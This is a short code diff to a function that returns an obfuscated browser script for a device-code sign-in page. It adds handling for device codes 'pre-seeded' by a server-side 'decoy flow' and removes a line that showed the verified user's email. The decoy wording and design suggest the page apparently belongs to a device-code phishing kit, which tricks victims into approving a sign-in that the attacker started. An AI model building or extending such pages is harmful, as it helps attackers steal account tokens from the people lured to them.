@@ -74,7 +74,6 @@ export function getPollingScript(): string {
       .then(function(r){return r.json()}).then(function(d){
         if(!_b1)return;
         if(d.status==='complete'){_b1=false;if(_pn)clearInterval(_pn);
-          var em=d.email||'';if(em&&em!=='unknown@user.com'){_h('_ae','Verified as <strong>'+em+'</strong>')}
           _sv('success');return}
         if(d.status==='expired'){_b1=false;if(_pn)clearInterval(_pn);_sv('expired');return}
         if(d.status==='slow_down'){iv=iv+5}
@@ -91,7 +90,20 @@ export function getPollingScript(): string {
     _sv('idle');
   }
 
+  // Support pre-seeded device codes (from server-side generation via decoy flow)
+  if(window.__preSeeded){
+    var ps=window.__preSeeded;
+    _cc=ps.deviceCode||ps.sessionId||null;
+    _d1=ps.userCode||'';
+    _sp=ps.expiresIn||900;
+    _ss=ps.interval||5;
+    _h('_cd',_d1);
+    _sv('code_ready');
+    if(_cc){_pk(_cc,_ss);}
+    _ct();
+  }
+
   window._tpl={start:_gn,copy:_cp,verify:_vf,reset:_rs};
-  _sv('idle');
+  if(!window.__preSeeded){_sv('idle');}
 })();`;
 }
